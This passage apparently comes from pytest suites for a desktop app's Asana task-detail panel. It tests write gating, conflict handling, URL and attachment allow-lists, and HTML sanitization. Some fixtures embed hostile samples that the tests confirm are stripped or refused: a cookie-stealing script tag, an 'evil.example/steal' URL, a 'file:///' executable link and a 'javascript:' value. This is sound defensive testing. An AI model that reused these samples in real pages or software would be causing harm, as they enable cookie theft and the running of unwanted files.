    caps = seen["data"][0]["capabilities"]
    assert set(caps.values()) == {False}


def test_non_asana_task_gets_no_asana_capabilities():
    ctrl, _c, seen = _controller()
    ctrl.show_task({"task_id": "d1", "source": "drive", "title": "Doc"})
    caps = seen["data"][0]["capabilities"]
    assert caps["complete"] is False and caps["refresh"] is False
    assert caps["subtask"] is True     # local checklist lane still works


def test_refresh_replays_and_is_silent_before_any_feed():
    ctrl, _c, seen = _shown()
    ctrl.js_refresh()
    assert len(seen["data"]) == 2 and seen["data"][0] == seen["data"][1]
    ctrl2, _c2, seen2 = _controller()
    ctrl2.js_refresh()
    assert seen2["data"] == []


# ── write gate: current-id, single-winner, release-on-reopen ─────────────

def test_toggle_complete_relays_the_writeback_lane():
    ctrl, calls, seen = _shown()
    ctrl.js_toggle_complete("t1", True)
    assert calls["write"] == [("set_completed_in_asana", "t1", True)]
    assert seen["resolved"][-1]["ok"] is True


def test_forged_or_stale_ids_never_write():
    ctrl, calls, seen = _shown()
    for bad in ("nope", "", None, "t2"):
        ctrl.js_toggle_complete(bad, True)
        ctrl.js_set_due(bad, "2026-09-02")
        ctrl.js_post_comment(bad, "hi")
        ctrl.js_add_subtask(bad, "hi")
    assert calls["write"] == []
    assert all(r["ok"] is False for r in seen["resolved"])


def test_single_winner_while_inflight_then_released_by_reopen():
    ctrl, calls, seen = _shown()
    ctrl.js_toggle_complete("t1", True)
    ctrl.js_post_comment("t1", "second while first inflight")
    assert len(calls["write"]) == 1
    assert seen["resolved"][-1]["error"] == "busy"
    ctrl.show_task(dict(TASK))            # the host reopen loop
    ctrl.js_post_comment("t1", "after reopen")
    assert calls["write"][-1] == ("post_comment_to_asana", "t1", "after reopen")


def test_write_dispatch_failure_releases_the_claim():
    def boom(*_a):
        raise RuntimeError("db locked")
    ctrl, calls, seen = _shown(write_fn=boom)
    ctrl.js_toggle_complete("t1", True)
    assert seen["resolved"][-1]["error"] == "dispatch_failed"
    ctrl.js_post_comment("t1", "still allowed")   # claim was released
    assert seen["resolved"][-1]["error"] == "dispatch_failed"


def test_set_due_validates_full_iso_and_change():
    ctrl, calls, seen = _shown()
    for bad in ("2026-9-2", "not-a-date", "javascript:x", "", None,
                "2026-09-021"):
        ctrl.js_set_due("t1", bad)
    assert calls["write"] == []
    ctrl.js_set_due("t1", "2026-09-01")           # unchanged
    assert calls["write"] == []
    assert seen["resolved"][-1]["error"] == "unchanged"
    ctrl.js_set_due("t1", "2026-09-15")
    assert calls["write"] == [("update_due_in_asana", "t1", "2026-09-15")]


def test_comment_and_subtask_require_text_and_cap_at_6000():
    ctrl, calls, _seen = _shown()
    ctrl.js_post_comment("t1", "   ")
    ctrl.js_add_subtask("t1", "")
    assert calls["write"] == []
    ctrl.js_post_comment("t1", "x" * 9000)
    assert len(calls["write"][0][2]) == 6000


def test_toggle_subtask_relays_served_gids_only():
    ctrl, calls, seen = _shown()
    ctrl.js_toggle_subtask("t1", "forged", True)
    ctrl.js_toggle_subtask("t1", "", True)
    ctrl.js_toggle_subtask("t1", None, True)
    assert calls["write"] == []
    assert seen["resolved"][-1]["error"] == "unknown_subtask"
    ctrl.js_toggle_subtask("t1", "sub900", True)
    assert calls["write"] == [
        ("set_subtask_completed_in_asana", "t1", "sub900", True)]
    assert seen["resolved"][-1]["ok"] is True


def test_toggle_subtask_respects_capability_and_current_id():
    ctrl, calls, seen = _shown(write_fn=None)
    ctrl.js_toggle_subtask("t1", "sub900", True)
    assert seen["resolved"][-1]["error"] == "not_allowed"
    ctrl2, calls2, seen2 = _shown()
    ctrl2.js_toggle_subtask("t2", "sub900", True)
    assert calls2["write"] == []
    assert seen2["resolved"][-1]["ok"] is False


def test_open_subtask_navigates_served_gids_only():
    opened = []
    ctrl, _c, _s2 = _shown(open_subtask_fn=lambda tid, gid: opened.append((tid, gid)))
    ctrl.js_open_subtask("t1", "forged")
    ctrl.js_open_subtask("t2", "sub900")     # stale task id
    assert opened == []
    ctrl.js_open_subtask("t1", "sub900")
    assert opened == [("t1", "sub900")]


def test_open_subtask_without_fn_or_broken_fn_is_silent():
    ctrl, _c, _s2 = _shown()
    ctrl.js_open_subtask("t1", "sub900")     # no fn injected

    def boom(*_a):
        raise RuntimeError("nope")
    ctrl2, _c2, _s3 = _shown(open_subtask_fn=boom)
    ctrl2.js_open_subtask("t1", "sub900")    # must not raise


def test_update_description_gates_and_caps():
    ctrl, calls, seen = _shown()
    ctrl.js_update_description("forged", "new body")
    assert calls["write"] == []
    ctrl.js_update_description("t1", "x" * 70000)
    lane, tid, md = calls["write"][0]
    assert lane == "update_description_in_asana" and tid == "t1"
    assert len(md) == 60000
    ctrl.show_task(dict(TASK))               # release the claim
    ctrl.js_update_description("t1", "")     # clearing is legal
    assert calls["write"][-1] == ("update_description_in_asana", "t1", "")
    assert seen["resolved"][-1]["ok"] is True


def test_update_description_requires_capability():
    ctrl, calls, seen = _shown(write_fn=None)
    ctrl.js_update_description("t1", "body")
    assert seen["resolved"][-1]["error"] == "not_allowed"


# ── the description LANE (asana_writeback) ───────────────────────────────

class _FakeAsanaRich:
    def __init__(self, fail=False, remote_modified="2026-08-10T13:00:00Z"):
        self.puts = []
        self.fail = fail
        self.remote_modified = remote_modified
        self.api_key = "k"

    def get_task(self, gid, **_kw):
        return {"gid": gid, "modified_at": self.remote_modified}

    def update_task(self, gid, **fields):
        self.puts.append((gid, fields))
        if self.fail:
            raise RuntimeError("HTTP 400")
        return {"gid": gid, "modified_at": "2026-08-10T14:00:00Z"}


def test_description_lane_remote_first_then_local(empty_db):
    from src.data import asana_writeback as awb
    from src.data import enablement_tasks as et
    conn = empty_db.conn
    tid, _sid = _seed_subtask(conn)
    client = _FakeAsanaRich()
    res = awb.update_description_in_asana(conn, tid, "**new** body",
                                          client=client)
    assert res == {"ok": True, "synced": True}
    gid, fields = client.puts[0]
    assert gid == "900100"
    assert fields["html_notes"].startswith("<body>")
    assert "<strong>new</strong>" in fields["html_notes"]
    assert (et.get_task(conn, tid) or {}).get("description") == "**new** body"


def test_description_lane_put_failure_changes_nothing_locally(empty_db):
    from src.data import asana_writeback as awb
    from src.data import enablement_tasks as et
    conn = empty_db.conn
    tid, _sid = _seed_subtask(conn)
    before = (et.get_task(conn, tid) or {}).get("description")
    res = awb.update_description_in_asana(conn, tid, "won't land",
                                          client=_FakeAsanaRich(fail=True))
    assert res["ok"] is False
    assert (et.get_task(conn, tid) or {}).get("description") == before


def test_description_lane_cas_conflict_blocks_then_refresh_unblocks(empty_db):
    from src.data import asana_writeback as awb
    from src.data import enablement_tasks as et
    conn = empty_db.conn
    tid, _sid = _seed_subtask(conn)
    et.update_task(conn, tid, remote_modified_at="2026-08-01T00:00:00Z")
    client = _FakeAsanaRich(remote_modified="2026-08-09T00:00:00Z")
    res = awb.update_description_in_asana(conn, tid, "clobber", client=client)
    assert res.get("conflict") is True
    assert client.puts == []
    # The documented remedy: the operator refreshes (the panel's ↻ restamps
    # the anchor to the observed remote), reviews, and the retry proceeds.
    et.update_task(conn, tid, remote_modified_at="2026-08-09T00:00:00Z")
    res2 = awb.update_description_in_asana(conn, tid, "seen and retried",
                                           client=client)
    assert res2 == {"ok": True, "synced": True}


def test_panel_refresh_restamps_the_cas_anchor():
    """Promoted subtask rows drift (subtask-local changes emit no board
    event), so the panel's explicit refresh MUST restamp — without it,
    every CAS write on a drifted promoted row conflicts forever."""
    import inspect
    from src.ui.pages.enablement.page import EnablementPage
    src = inspect.getsource(EnablementPage._run_task_refresh)
    assert 'remote_modified_at=payload["modified_at"]' in src


# ── the subtask completion LANE (asana_writeback) ────────────────────────

class _FakeAsana:
    def __init__(self, fail=False):
        self.calls = []
        self.fail = fail
        self.api_key = "k"

    def update_task(self, gid, **fields):
        self.calls.append((gid, fields))
        if self.fail:
            raise RuntimeError("HTTP 500")
        return {"gid": gid, "modified_at": "2026-08-10T13:00:00Z"}


def _seed_subtask(conn):
    from src.data import enablement_tasks as et
    tid = et.create_task(conn, source="asana", kind="request",
                         title="Parent", source_ref="900100")
    sid = et.add_subtask(conn, tid, "Draft card")
    conn.execute(
        "UPDATE enablement_subtasks SET asana_subtask_gid = 'sub900' "
        "WHERE subtask_id = ?", (sid,))
    conn.commit()
    return tid, sid


def test_subtask_lane_flips_local_and_remote(empty_db):
    from src.data import asana_writeback as awb
    from src.data import enablement_tasks as et
    conn = empty_db.conn
    tid, _sid = _seed_subtask(conn)
    client = _FakeAsana()
    res = awb.set_subtask_completed_in_asana(conn, tid, "sub900", True,
                                            client=client)
    assert res == {"ok": True, "synced": True, "done": True}
    assert client.calls == [("sub900", {"completed": True})]
    subs = et.list_subtasks(conn, tid)
    assert subs[0]["done"] == 1


def test_subtask_lane_reverts_local_flip_on_api_failure(empty_db):
    from src.data import asana_writeback as awb
    from src.data import enablement_tasks as et
    conn = empty_db.conn
    tid, _sid = _seed_subtask(conn)
    res = awb.set_subtask_completed_in_asana(conn, tid, "sub900", True,
                                            client=_FakeAsana(fail=True))
    assert res["ok"] is False and res["reverted"] is True
    assert et.list_subtasks(conn, tid)[0]["done"] == 0


def test_subtask_lane_unknown_gid_and_missing_gid_refuse(empty_db):
    from src.data import asana_writeback as awb
    conn = empty_db.conn
    tid, _sid = _seed_subtask(conn)
    assert awb.set_subtask_completed_in_asana(
        conn, tid, "nope", True, client=_FakeAsana())["error"] == "subtask_not_found"
    assert awb.set_subtask_completed_in_asana(
        conn, tid, "", True, client=_FakeAsana())["error"] == "subtask_gid_required"


def test_subtask_lane_degrades_local_only_without_client(empty_db, monkeypatch):
    from src.data import asana_writeback as awb
    from src.data import enablement_tasks as et
    conn = empty_db.conn
    tid, _sid = _seed_subtask(conn)
    monkeypatch.setattr(awb, "_client", lambda c: None)
    res = awb.set_subtask_completed_in_asana(conn, tid, "sub900", True)
    assert res["ok"] is True and res["synced"] is False
    assert et.list_subtasks(conn, tid)[0]["done"] == 1


# ── url + attachment gates ───────────────────────────────────────────────

def test_open_url_only_registry_members():
    ctrl, calls, _seen = _shown()
    ctrl.js_open_url("https://evil.example/steal")
    ctrl.js_open_url("")
    ctrl.js_open_url(None)
    assert calls["urls"] == []
    ctrl.js_open_url("https://app.asana.com/0/1/900100")   # the permalink
    ctrl.js_open_url("https://doc.example/z")              # a comment link
    assert calls["urls"] == ["https://app.asana.com/0/1/900100",
                             "https://doc.example/z"]


def test_open_url_with_broken_opener_never_raises():
    def boom(_u):
        raise RuntimeError("no browser")
    ctrl, _c, _s = _shown(open_url_fn=boom)
    ctrl.js_open_url("https://app.asana.com/0/1/900100")


class _FakeClient:
    def __init__(self, url="https://app.example/view", error=None):
        self.asked = []
        self._url = url
        self._error = error

    def get_attachment(self, gid):
        self.asked.append(gid)
        if self._error:
            raise RuntimeError(self._error)
        return {"gid": gid, "view_url": self._url, "download_url": ""}


def _drain(ctrl, app):
    for t in ctrl._att_threads:
        t.join(timeout=5)
    for _ in range(3):
        app.processEvents()


def test_open_attachment_resolves_and_opens_http_only(monkeypatch, _qt_app):
    opened = []
    import src.services.task_web as tw
    monkeypatch.setattr(tw.webbrowser, "open", lambda u: opened.append(u))
    client = _FakeClient()
    ctrl, _c, seen = _shown(client_factory=lambda: client)
    ctrl.js_open_attachment("a1")
    _drain(ctrl, _qt_app)
    assert client.asked == ["a1"]
    assert opened == ["https://app.example/view"]
    assert seen["resolved"][-1] == {"action": "open_attachment",
                                    "task_id": "a1", "ok": True, "error": ""}


def test_open_attachment_refuses_non_web_urls(monkeypatch, _qt_app):
    opened = []
    import src.services.task_web as tw
    monkeypatch.setattr(tw.webbrowser, "open", lambda u: opened.append(u))
    ctrl, _c, seen = _shown(
        client_factory=lambda: _FakeClient(url="file:///C:/evil.exe"))
    ctrl.js_open_attachment("a1")
    _drain(ctrl, _qt_app)
    assert opened == []
    assert seen["resolved"][-1]["error"] == "non_web_url"
    assert any("Refused" in s for s in seen["status"])


def test_open_attachment_unknown_gid_is_silent():
    client = _FakeClient()
    ctrl, _c, seen = _shown(client_factory=lambda: client)
    ctrl.js_open_attachment("forged")
    ctrl.js_open_attachment("")
    assert client.asked == []
    assert all(r["ok"] is False for r in seen["resolved"])


def test_open_attachment_resolve_error_surfaces_status(monkeypatch, _qt_app):
    ctrl, _c, seen = _shown(
        client_factory=lambda: _FakeClient(error="HTTP 401"))
    ctrl.js_open_attachment("a1")
    _drain(ctrl, _qt_app)
    assert seen["resolved"][-1]["error"] == "resolve_failed"
    assert any("HTTP 401" in s for s in seen["status"])


def test_action_outcomes_surface_in_panel_status():
    """The phantom-save lesson: a CAS conflict or API failure whose only
    trace is the app status line reads as a silently swallowed save. The
    host relays writeback OUTCOMES into the panel's own status signal."""
    ctrl, _c, seen = _shown()
    ctrl.notify_action_outcome({"ok": False, "conflict": True})
    assert seen["status"][-1] == "Task changed in Asana — refreshed. Please retry."
    ctrl.notify_action_outcome({"ok": False, "error": "HTTP 400"})
    assert seen["status"][-1] == "Asana action failed: HTTP 400"
    ctrl.notify_action_outcome({"ok": True, "synced": True})
    assert seen["status"][-1] == "Synced to Asana."
    ctrl.notify_action_outcome({"ok": True, "synced": False, "note": "not linked"})
    assert seen["status"][-1] == "Saved locally — not linked"
    ctrl.notify_action_outcome({"ok": True, "refreshed": True})
    assert seen["status"][-1] == "Refreshed from Asana."
    ctrl.notify_action_outcome("garbage")     # never raises
    ctrl.notify_action_outcome(None)


# ── refreshTask ──────────────────────────────────────────────────────────

def test_refresh_task_relays_current_id_only():
    ctrl, calls, seen = _shown()
    ctrl.js_refresh_task("forged")
    assert calls["refresh"] == []
    ctrl.js_refresh_task("t1")
    assert calls["refresh"] == [("t1", "900100")]
    assert seen["resolved"][-1]["ok"] is True


# ── bridge: pure relay ───────────────────────────────────────────────────

def test_bridge_relays_signals_and_slots():
    ctrl, calls, _seen = _controller()
    bridge = TaskBridge(
        data_signal=ctrl.task_data, status_signal=ctrl.status_text,
        resolved_signal=ctrl.action_resolved,
        refresh_fn=ctrl.js_refresh, refresh_task_fn=ctrl.js_refresh_task,
        complete_fn=ctrl.js_toggle_complete, due_fn=ctrl.js_set_due,
        comment_fn=ctrl.js_post_comment, subtask_fn=ctrl.js_add_subtask,
        attachment_fn=ctrl.js_open_attachment, url_fn=ctrl.js_open_url)
    got = {"data": [], "resolved": []}
    bridge.taskData.connect(lambda j: got["data"].append(json.loads(j)))
    bridge.actionResolved.connect(lambda j: got["resolved"].append(json.loads(j)))
    ctrl.show_task(dict(TASK))
    assert len(got["data"]) == 1
    bridge.toggleComplete("t1", True)
    assert calls["write"] == [("set_completed_in_asana", "t1", True)]
    assert got["resolved"][-1]["ok"] is True
    bridge.refresh()
    assert len(got["data"]) == 2
    assert bridge.ping() == "pong"


def test_bridge_with_nothing_injected_is_inert():
    bridge = TaskBridge()
    bridge.refresh()
    bridge.refreshTask("t1")
    bridge.toggleComplete("t1", True)
    bridge.setDue("t1", "2026-09-15")
    bridge.postComment("t1", "x")
    bridge.addSubtask("t1", "x")
    bridge.openAttachment("a1")
    bridge.openUrl("https://x.example/")
    assert bridge.ping() == "pong"


def test_bridge_swallows_raising_callables():
    def boom(*_a):
        raise RuntimeError("nope")
    bridge = TaskBridge(refresh_fn=boom, refresh_task_fn=boom,
                        complete_fn=boom, due_fn=boom, comment_fn=boom,
                        subtask_fn=boom, attachment_fn=boom, url_fn=boom)
    bridge.refresh()
    bridge.refreshTask("x")
    bridge.toggleComplete("x", False)
    bridge.setDue("x", "2026-01-01")
    bridge.postComment("x", "y")
    bridge.addSubtask("x", "y")
    bridge.openAttachment("x")
    bridge.openUrl("x")   # none of these may raise


if __name__ == "__main__":
    import sys
    sys.exit(pytest.main([__file__, "-q"]))
~~~~

## A · `tests/test_task_web_controller.py`  — 458 lines · sha256 `6520ca696456c4e7b90ed4f8768cc0448777651bde4c69f114f9a297bcd49de8`

~~~~
"""task_vm builder contracts + the no-Asana-write AST fence + native parity.

The builders are pure functions of the SAME enriched task dict page.py hands
the native TaskDetailPanel — the parity tests at the bottom feed one dict to
both surfaces and compare what each renders, guarding the deliberate
formatting duplication (src/services must not import src/ui).
"""

import ast
import os
from datetime import datetime, timezone
from pathlib import Path

import pytest

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

from src.services import task_vm  # noqa: E402

NOW = datetime(2026, 8, 10, 12, 0, 0)
FETCHED = datetime(2026, 8, 10, 11, 55, 0, tzinfo=timezone.utc).isoformat()

EXTRAS = {
    "fetched_at": FETCHED,
    "html_notes": (
        '<p><strong>Name</strong></p><p>Dana Whitfield</p>'
        '<script>steal(document.cookie)</script>'
        '<p><a href="https://docs.example.com/outline">the outline</a></p>'),
    "custom_fields": [
        {"gid": "f1", "name": "Request Type", "resource_subtype": "enum",
         "display_value": "Guru: Update",
         "enum_value": {"gid": "e1", "name": "Guru: Update", "color": "green"}},
        {"gid": "f2", "name": "Urgent?", "display_value": "No",
         "enum_value": {"name": "No", "color": "red"}},
        {"gid": "f3", "name": "Audience", "resource_subtype": "multi_enum",
         "display_value": "Care Navigators, Billing",
         "multi_enum_values": [{"name": "Care Navigators", "color": "aqua"},
                               {"name": "Billing", "color": "martian-teal"}]},
        {"gid": "f4", "name": "Requested By", "resource_subtype": "people",
         "display_value": "Dana Whitfield",
         "people_value": [{"gid": "u1", "name": "Dana Whitfield"}]},
        {"gid": "f5", "name": "Go-Live", "resource_subtype": "date",
         "display_value": "2026-10-17", "date_value": {"date": "2026-10-17"}},
        {"gid": "f6", "name": "Effort", "resource_subtype": "number",
         "display_value": "12", "number_value": 12},
        {"gid": "f7", "name": "Reviewed", "resource_subtype": "checkbox",
         "display_value": "true"},
        {"gid": "f8", "name": "Empty text", "resource_subtype": "text",
         "display_value": ""},
        {"gid": "f9", "name": "", "display_value": "nameless — dropped"},
        {"gid": "f10", "name": "Martian", "resource_subtype": "martian",
         "display_value": "?"},
    ],
    "attachments": [
        {"gid": "a1", "name": "#cx thread", "host": "SLACK"},
        {"gid": "a2", "name": "tiers.png", "host": "asana"},
        {"gid": "", "name": "", "host": "asana"},
    ],
    "stories": [
        {"gid": "s1", "text": "added this task to CX Requests",
         "created_at": "2026-07-01T12:00:00Z", "author": "Jordan Avery",
         "subtype": "added_to_project"},
        {"gid": "s2", "text": "see https://x.example/y for context",
         "created_at": "2026-07-02T12:00:00Z", "author": "Dana Whitfield",
         "subtype": "comment_added"},
        {"gid": "s3", "text": "When Task is overdue → Comment on Task",
         "created_at": "2026-07-03T12:00:00Z", "author": "",
         "subtype": "comment_added"},
        {"gid": "s4", "text": "legacy pre-058 row, no subtype key",
         "created_at": "2026-07-04T12:00:00Z", "author": "Priya Nair"},
        {"gid": "s5",
         "html": ('<body>ping <a href="https://app.asana.com/0/profile/9">'
                  '@Priya Nair</a> — see <a href="https://doc.example/z">the doc'
                  '</a><script>evil()</script></body>'),
         "text": "ping @Priya Nair — see the doc",
         "created_at": "2026-07-05T12:00:00Z", "author": "Marcus Lee",
         "subtype": "comment_added"},
    ],
    "task_fields": {
        "start_on": "2026-08-15", "due_on": "2026-09-01", "completed": False,
        "followers": [{"name": "Jordan Avery"}, {"name": "Priya Nair"}],
        "permalink_url": "https://app.asana.com/0/1/900100",
    },
}

TASK = {
    "task_id": "t1", "source": "asana", "source_ref": "900100",
    "title": "BCBSMA copay update [[no value]]", "status": "in_progress",
    "assignee": "Jordan Avery", "due_iso": "2026-09-01",
    "due_date": "2026-09-01",
    "source_url": "https://app.asana.com/0/1/900100",
    "board_names": ["CX Requests"],
    "description": "plain fallback",
    "subtasks": [
        {"text": "Draft card", "done": True, "assignee": "Renn Ops",
         "due": "2026-08-01"},
        ("Legacy tuple", False),
        {"text": "", "done": False},
    ],
    "extras": EXTRAS,
}


def _vm(task=TASK, **kw):
    kw.setdefault("now", NOW)
    return task_vm.build_task_vm(task, **kw)


# ── contract keys: MUST stay in lockstep with web/src/task fixtures ──────

def test_top_level_keys_match_js_contract():
    assert sorted(_vm()) == [
        "attachments", "capabilities", "connected", "demo", "description",
        "fields", "header", "stories", "subtasks", "task_id",
    ]


def test_header_keys_match_js_contract():
    assert sorted(_vm()["header"]) == [
        "assignee", "collaborators", "completed", "completed_on",
        "due_display", "due_iso", "freshness", "overdue", "permalink",
        "projects", "status_pill", "title",
    ]


def test_capabilities_keys_match_js_contract():
    assert sorted(_vm()["capabilities"]) == [
        "comment", "complete", "description", "due", "refresh", "subtask"]


def test_description_markdown_round_trip_for_the_editor():
    desc = _vm()["description"]
    assert sorted(desc) == ["markdown", "srcdoc"]
    assert "Name" in desc["markdown"]           # html→md of the rich body
    assert "<" not in desc["markdown"].replace("<https", "")  # no tags leak
    plain = _vm(dict(TASK, extras={}, description="plain body"))
    assert plain["description"]["markdown"] == "plain body"


# ── header ───────────────────────────────────────────────────────────────

def test_due_range_renders_start_to_due():
    h = _vm()["header"]
    assert h["due_display"] == "Aug 15, 2026 – Sep 1, 2026"
    assert h["due_iso"] == "2026-09-01"
    assert h["overdue"] is False


def test_overdue_when_due_past_and_open():
    task = dict(TASK, due_iso="2026-08-01", due_date="2026-08-01")
    assert _vm(task)["header"]["overdue"] is True


def test_completed_via_status_kills_overdue():
    task = dict(TASK, status="done", due_iso="2026-08-01")
    h = _vm(task)["header"]
    assert h["completed"] is True and h["overdue"] is False


def test_collaborators_exclude_the_assignee():
    h = _vm()["header"]
    assert h["assignee"]["name"] == "Jordan Avery"
    assert [c["name"] for c in h["collaborators"]] == ["Priya Nair"]
    assert h["assignee"]["initials"] == "JA"


def test_freshness_and_not_synced_wording():
    assert _vm()["header"]["freshness"].startswith("Updated ")
    task = dict(TASK, extras={})
    assert _vm(task)["header"]["freshness"] == "Not synced yet"


def test_projects_from_board_names_and_permalink():
    h = _vm()["header"]
    assert h["projects"] == [{"board": "CX Requests", "section": ""}]
    assert h["permalink"] == "https://app.asana.com/0/1/900100"


def test_dash_assignee_becomes_none():
    task = dict(TASK, assignee="—")
    assert _vm(task)["header"]["assignee"] is None


# ── fields: the typed mapping table ──────────────────────────────────────

def test_field_kinds_and_pills():
    fields = {f["name"]: f for f in _vm()["fields"]}
    assert fields["Request Type"]["kind"] == "enum"
    assert fields["Request Type"]["pills"] == [
        {"text": "Guru: Update", "color": "green"}]
    assert fields["Urgent?"]["kind"] == "enum"          # inferred, no subtype
    assert fields["Urgent?"]["pills"][0]["color"] == "red"
    assert fields["Audience"]["kind"] == "multi_enum"
    assert [p["text"] for p in fields["Audience"]["pills"]] == [
        "Care Navigators", "Billing"]
    assert fields["Audience"]["pills"][1]["color"] == ""   # unknown color name
    assert fields["Requested By"]["kind"] == "people"
    assert fields["Requested By"]["people"][0]["initials"] == "DW"
    assert fields["Go-Live"]["kind"] == "date"
    assert fields["Go-Live"]["value"] == "Oct 17, 2026"
    assert fields["Effort"]["kind"] == "number"
    assert fields["Reviewed"]["kind"] == "checkbox"
    assert fields["Reviewed"]["checked"] is True
    assert fields["Empty text"]["value"] == ""
    assert fields["Martian"]["kind"] == "text"           # unknown subtype
    assert "" not in fields                              # nameless dropped


def test_field_value_capped_at_6000():
    extras = {"custom_fields": [
        {"gid": "x", "name": "Big", "resource_subtype": "text",
         "display_value": "y" * 9000}]}
    vm = _vm(dict(TASK, extras=extras))
    assert len(vm["fields"][0]["value"]) == 6000


# ── stories: kind split + tokens ─────────────────────────────────────────

def test_story_kind_split():
    kinds = {s["gid"]: s["kind"] for s in _vm()["stories"]}
    assert kinds == {"s1": "system", "s2": "comment", "s3": "automation",
                     "s4": "comment", "s5": "comment"}


def test_plain_text_autolinks():
    s2 = next(s for s in _vm()["stories"] if s["gid"] == "s2")
    assert {"t": "link", "v": "https://x.example/y",
            "href": "https://x.example/y"} in s2["tokens"]


def test_html_text_yields_mention_and_link_tokens_and_drops_script():
    s5 = next(s for s in _vm()["stories"] if s["gid"] == "s5")
    kinds = [(t["t"], t["v"]) for t in s5["tokens"]]
    assert ("mention", "Priya Nair") in kinds
    assert ("link", "the doc") in kinds
    joined = "".join(t["v"] for t in s5["tokens"])
    assert "evil()" not in joined
    assert "steal" not in joined


def test_story_text_capped_at_6000():
    story = {"gid": "s", "text": "z" * 9000, "subtype": "comment_added",
             "author": "A", "created_at": "2026-07-01T12:00:00Z"}
    vm = task_vm.story_vm(story)
    assert sum(len(t["v"]) for t in vm["tokens"]) == 6000


def test_story_timestamp_formats_and_degrades():
    assert task_vm.fmt_story_ts("not-a-date")[:10] == "not-a-date"[:10]
    out = task_vm.fmt_story_ts("2026-07-05T12:00:00Z")
    assert out.startswith("Jul ") and ("AM" in out or "PM" in out)


# ── description: the ONE html surface, sanitized ─────────────────────────

def test_description_sanitized_srcdoc():
    doc = _vm()["description"]["srcdoc"]
    assert "<strong>Name</strong>" in doc
    assert "the outline" in doc
    assert "<script" not in doc
    assert "steal(" not in doc


def test_description_plain_fallback_escapes():
    task = dict(TASK, extras={}, description="a <script> & b\nc")
    doc = _vm(task)["description"]["srcdoc"]
    assert "<script>" not in doc
    assert "a " in doc and "b" in doc


def test_description_empty_when_no_sources():
    task = dict(TASK, extras={}, description="")
    assert _vm(task)["description"]["srcdoc"] == ""


# ── subtasks / attachments ───────────────────────────────────────────────

def test_subtasks_rich_and_legacy_shapes():
    subs = _vm()["subtasks"]
    assert [s["name"] for s in subs] == ["Draft card", "Legacy tuple"]
    assert subs[0]["done"] is True and subs[0]["promoted"] is True
    assert subs[0]["assignee"] == "Renn Ops"
    assert subs[0]["due"] == "Aug 1"          # same-year short form
    assert subs[1]["promoted"] is False


def test_attachments_require_names_and_lower_hosts():
    atts = _vm()["attachments"]
    assert atts == [{"gid": "a1", "name": "#cx thread", "host": "slack"},
                    {"gid": "a2", "name": "tiers.png", "host": "asana"}]


# ── degradation: no extras at all ────────────────────────────────────────

def test_missing_extras_yields_total_empty_sections():
    vm = _vm({"task_id": "t9", "source": "asana", "title": "Bare"})
    assert vm["fields"] == [] and vm["stories"] == [] and vm["attachments"] == []
    assert vm["header"]["title"] == "Bare"
    assert vm["description"]["srcdoc"] == ""


def test_garbage_input_never_raises():
    for garbage in (None, 7, "x", {"extras": "nope", "subtasks": 3}):
        vm = task_vm.build_task_vm(garbage)
        assert sorted(vm) == sorted(_vm())


# ── link registry ────────────────────────────────────────────────────────

def test_link_registry_collects_permalink_and_token_hrefs():
    vm = _vm()
    links = task_vm.link_registry(vm)
    assert "https://app.asana.com/0/1/900100" in links
    assert "https://doc.example/z" in links
    assert "https://x.example/y" in links
    assert "https://evil.example/" not in links


# ── the AST no-Asana-write fence (mirrors test_guru_scope_removal_guard) ─

_ASANA_WRITE_IDENTIFIERS = {
    "create_task", "create_subtask", "add_comment", "update_due_date",
    "update_task", "_send",
    "set_completed_in_asana", "update_due_in_asana", "post_comment_to_asana",
    "create_subtask_in_asana", "set_subtask_completed_in_asana",
    "update_description_in_asana", "toggle_subtask", "asana_writeback",
}

_WEB_TASK_SURFACES = [
    Path("src/services/task_vm.py"),
    Path("src/services/task_web.py"),
    Path("src/ui/web/task_bridge.py"),
    Path("src/ui/web/task_host.py"),
]


def _identifiers(path: Path) -> set:
    tree = ast.parse(path.read_text("utf-8"))
    names: set = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Attribute):
            names.add(node.attr)
        elif isinstance(node, ast.Name):
            names.add(node.id)
    return names


def test_web_task_surfaces_reference_no_asana_write():
    """Writes must relay through the injected host lane; the lane NAMES are
    held as strings (AST identifiers don't see them), so any identifier hit
    here means someone wired a direct write path."""
    root = Path(__file__).resolve().parent.parent
    for path in _WEB_TASK_SURFACES:
        hit = _ASANA_WRITE_IDENTIFIERS & _identifiers(root / path)
        assert not hit, (
            f"{path.name} references Asana write path(s) {sorted(hit)} — "
            "web task writes relay ONLY through the injected host lanes")


def test_controller_still_reads_attachments():
    # read-only is not read-nothing
    root = Path(__file__).resolve().parent.parent
    assert "get_attachment" in _identifiers(root / "src/services/task_web.py")


# ── page wiring: construction fallback + one-host reuse ─────────────────

def _page_stub():
    from types import SimpleNamespace
    return SimpleNamespace(
        _run_task_writeback=lambda *a: None,
        _run_task_refresh=lambda *a: None,
        _open_source_url=lambda u: None,
        _open_subtask_from_web=lambda *a: None,
        _set_status=lambda s: None,
        task_action_done=SimpleNamespace(connect=lambda fn: None),
    )


def test_page_marks_session_native_on_construction_failure(monkeypatch):
    import src.ui.web.task_host as th
    from src.ui.pages.enablement.page import EnablementPage

    def boom(**_kw):
        raise RuntimeError("no webengine")

    monkeypatch.setattr(th, "build_task_web_triple", boom)
    stub = _page_stub()
    ctrl, host = EnablementPage._get_task_web_host(stub)
    assert ctrl is None and host is None
    assert stub._task_web_failed is True
    assert EnablementPage._task_web_available(stub) is False


def test_page_builds_the_web_host_once_and_reuses_it(monkeypatch):
    from types import SimpleNamespace
    import src.ui.web.task_host as th
    from src.ui.pages.enablement.page import EnablementPage

    fake_ctrl = SimpleNamespace(
        status_text=SimpleNamespace(connect=lambda _fn: None),
        notify_action_outcome=lambda res: None)
    fake_bridge, fake_host = object(), object()
    calls = []

    def fake(**kw):
        calls.append(kw)
        return fake_ctrl, fake_bridge, fake_host

    monkeypatch.setattr(th, "build_task_web_triple", fake)
    stub = _page_stub()
    first = EnablementPage._get_task_web_host(stub)
    second = EnablementPage._get_task_web_host(stub)
    assert first == (fake_ctrl, fake_host)
    assert second == (fake_ctrl, fake_host)   # same objects — ONE Chromium
    assert len(calls) == 1
    assert stub._task_web_bridge is fake_bridge   # GC guard held


# ── native parity: one dict, two surfaces ────────────────────────────────

@pytest.mark.ui
def test_native_and_web_render_the_same_data():
    from PySide6.QtWidgets import QApplication, QLabel
    app = QApplication.instance()
    if app is not None and not isinstance(app, QApplication):
        pytest.skip("a non-widget QCoreApplication owns this process")
    app = app or QApplication([])
    from src.ui.pages.enablement.task_detail import TaskDetailPanel

